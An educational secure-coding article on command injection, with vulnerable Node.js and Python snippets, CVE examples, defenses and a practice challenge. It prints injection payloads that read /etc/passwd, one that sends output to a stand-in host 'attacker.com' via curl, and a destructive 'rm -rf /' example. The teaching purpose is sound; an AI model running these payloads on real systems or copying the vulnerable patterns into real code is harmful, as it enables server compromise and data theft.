# Command Injection
**Category:** Application Security
**Date:** 2026-06-12
**Difficulty:** Intermediate

---

## What It Is
Command injection occurs when an application passes untrusted input into a system shell or OS command without proper sanitization, allowing an attacker to append or substitute their own commands. Unlike SQL injection (which targets a database), command injection gives the attacker the ability to execute arbitrary operating system commands with the privileges of the running application. It typically arises when developers use functions like `exec()`, `system()`, `popen()`, or shell-out helpers to call external programs (ping, convert, zip, grep, etc.) and build the command string from user-controlled data.

## Why It Matters
A successful command injection often leads to full server compromise — reading `/etc/passwd`, exfiltrating environment secrets, pivoting to internal networks, or dropping a reverse shell. The 2021 Pulse Connect Secure VPN exploits (CVE-2021-22893) and countless router/IoT CVEs trace back to unsanitized input reaching shell commands, and Shellshock (CVE-2014-6271) showed how a single injectable environment variable could compromise millions of CGI-enabled servers worldwide.

## Practical Example
Vulnerable Node.js code that lets a user "ping" a host:

```javascript
const { exec } = require('child_process');

app.get('/ping', (req, res) => {
  const host = req.query.host;
  exec(`ping -c 4 ${host}`, (err, stdout) => {
    res.send(stdout);
  });
});
```

An attacker requests:

```
GET /ping?host=8.8.8.8;cat+/etc/passwd
```

The shell sees `ping -c 4 8.8.8.8;cat /etc/passwd` and happily runs both commands. Other classic separators/operators that achieve the same thing: `&&`, `||`, `|`, backticks `` `cmd` ``, and `$(cmd)`.

A Python equivalent:

```python
import os
os.system("nslookup " + user_input)  # vulnerable
```

Payload: `8.8.8.8 & curl http://attacker.com/$(whoami)`

## How to Defend
- **Avoid shell invocation entirely** — use APIs that take argument arrays (e.g., Node's `execFile()`/`spawn()` with an args array, Python's `subprocess.run([...], shell=False)`) instead of building shell strings.
- **Allowlist input** — for things like hostnames, validate against a strict regex (`^[a-zA-Z0-9.-]+$`) and reject anything else rather than trying to "escape" dangerous characters.
- **Use built-in language libraries** instead of shelling out — e.g., use a DNS library instead of calling `nslookup`, or an image-processing library instead of calling `convert`.
- **Run with least privilege** — if a command must execute, run it in a sandboxed/containerized context with a non-root user and no network access where possible.
- **Apply defense in depth** — combine input validation with seccomp/AppArmor profiles and outbound egress filtering so even a successful injection has limited blast radius.

## Today's Challenge
Find a piece of code (yours or an open-source project) that calls `exec`, `os.system`, `subprocess` with `shell=True`, backticks, or similar. Trace where its input comes from — is it ever user-controlled? Then rewrite it to use an argument-array form (`spawn`/`execFile`/`subprocess.run([...])`) and verify it still works with a legitimate input, but now fails safely on `; rm -rf /` style payloads.

## Key Takeaway
If user input ever touches a shell command, it's not "if" it gets exploited — it's "when"; use argument arrays and allowlists, never string concatenation.
